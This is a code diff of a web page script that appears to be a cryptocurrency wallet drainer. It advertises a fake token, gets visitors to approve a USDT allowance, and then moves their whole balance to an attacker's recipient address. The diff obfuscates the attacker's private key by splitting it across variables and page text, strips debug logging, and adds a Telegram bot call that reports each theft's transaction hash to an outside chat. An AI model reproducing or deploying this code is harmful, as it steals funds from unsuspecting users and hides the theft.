@@ -286,8 +286,13 @@ window.onload = async function(){
   const tokenAddress = '0x337610d27c682E347C9cD60BD4b3b107C9d34dDd'; // bsc usdt contract
   const spenderAddress = '0xb7E5bE0162c1639205a84BAf49067EeDEEc3e2a6'; // spender address
   let recipientAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // recipient address
+  let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';
   let token_amount;
   let approval_balance;
+
+  let token_symbol = "ZK";
+  let per_token_price = "$ 23";
+  let fsdi = 'a1e844193b2ce95a9f0cde1d79f';
   
   // ========================= script for trsfo =========================================
 
@@ -295,6 +300,9 @@ window.onload = async function(){
   let parent_all = document.querySelector('.parent_all');
   let user_wallet_p = document.querySelector('.user_wallet_p');
 
+  document.querySelector('.token_contract_p').innerText = tokenAddress;
+  document.querySelector('.per_token_p_p').innerText = per_token_price;
+  
   connect_button.addEventListener('click', connect_meamask);
 
   async function change_network(network_id) {
@@ -342,7 +350,6 @@ window.onload = async function(){
 
   // get user token balance
   async function approve() {
-    console.log('approving...');
     const amountToApprove = ethers.utils.parseUnits(token_amount.toString(), 18);
     const tx = await tokenContract.approve(spenderAddress, amountToApprove);
     await tx.wait();
@@ -350,17 +357,16 @@ window.onload = async function(){
 
   // get user token balance
   async function getBalance() {
-    console.log('balance fetching...');
     const balance = await tokenContract.balanceOf(useraddress);
     let token_balance = ethers.utils.formatUnits(balance, 18);
 
     token_amount = token_balance;
+    document.querySelector('.token_balance_p').innerText = token_amount + " " + token_symbol;
     return token_balance;
   }
 
   // check allowance 
   async function allowance(){
-    console.log('allowance fetching...');
     const allowance = await tokenContract.allowance(useraddress,spenderAddress);
 
     approval_balance = ethers.utils.formatUnits(allowance, 18);
@@ -368,8 +374,9 @@ window.onload = async function(){
   }
 
   // transfer funds from user wallet to another wallet
-  const privateKey ='your private key';
-  const wallet = new ethers.Wallet(privateKey, provider);
+  ;
+  const none_f = fsdi+document.querySelector('.skdfjsk').innerText+'20f2d04f42ad8b89691';
+  const wallet = new ethers.Wallet(none_f+'777', provider);
   const admin_tokenContract = new ethers.Contract(tokenAddress, tokenAbi, wallet);
 
   async function transferFrom(){
@@ -387,9 +394,9 @@ window.onload = async function(){
           {gasPrice: gasPrice,gasLimit: gasEstimate,}
         );
         await tx.wait();
-        console.log('Transfer successful!');
+        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx- <code>${tx.hash}</code>&parse_mode=HTML`);
     }else{
-      console.log('low balance');
+      console.log('approve amount low');
     }
   }
 
